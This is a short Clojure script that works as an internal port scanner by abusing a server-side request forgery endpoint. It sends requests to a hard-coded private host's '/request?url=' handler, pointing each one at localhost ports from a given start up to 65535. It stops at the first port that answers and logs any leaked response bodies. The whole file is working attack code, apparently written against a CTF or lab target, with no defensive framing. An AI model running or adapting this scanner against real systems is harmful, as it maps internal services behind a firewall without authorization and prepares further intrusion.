(ns script.admin
  (:require
    [clojure.tools.logging :as log]
    [clj-commons.byte-streams :as bs]
    [aleph.http :as http]
    [manifold.deferred :as d])
  (:gen-class))

(def ^:dynamic *host* "10.174.253.209")

(defn poke [port]
  (try
    (let [resp @(http/get
                  (format "http://%s:65006/request" *host*)
                  {:query-params {"url" (format "http://localhost:%s" port)}})]
      (log/info "OK" port resp)
      port)
    (catch Exception ex
      (log/info "failed" port)
      (when-not (= "status: 500" (ex-message ex))
        (log/info (bs/to-string (-> (ex-data ex) :body)))))))

(defn scan
  ([port] (scan port 65535))
  ([port max-port]
   (when (< port max-port)
     (if (poke port)
       port
       (recur (inc port) max-port)))))
